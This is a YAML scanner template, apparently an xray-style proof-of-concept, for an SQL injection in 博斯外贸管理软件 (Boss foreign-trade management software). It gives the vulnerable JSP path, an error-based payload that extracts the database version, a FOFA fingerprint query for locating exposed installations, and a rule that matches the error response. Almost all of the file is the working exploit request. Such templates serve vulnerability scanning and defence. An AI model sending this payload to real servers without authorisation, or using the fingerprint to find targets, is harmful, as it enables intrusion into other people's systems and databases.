id: poc-yaml-51boss-2011dcdraft-jsp-sqli
info:
  name: 博斯外贸管理软件 2011DCdraft.jsp SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 博斯外贸管理软件
  fofa: title="欢迎使用 博斯软件"
requests:
- method: GET
  path: /crm/module/2011DCdraft.jsp?c_ex1=1'and+1=@@version--
  expression: status_code == 200 && contains(body,"java.sql.SQLException") && contains(body,"Microsoft
    SQL Server") && contains(gbk_decode(body),"草稿箱") && contains(gbk_decode(body),"数据类型")
    && matches(gbk_decode(body),"将(.*?)值")
variables: {}
transport: http
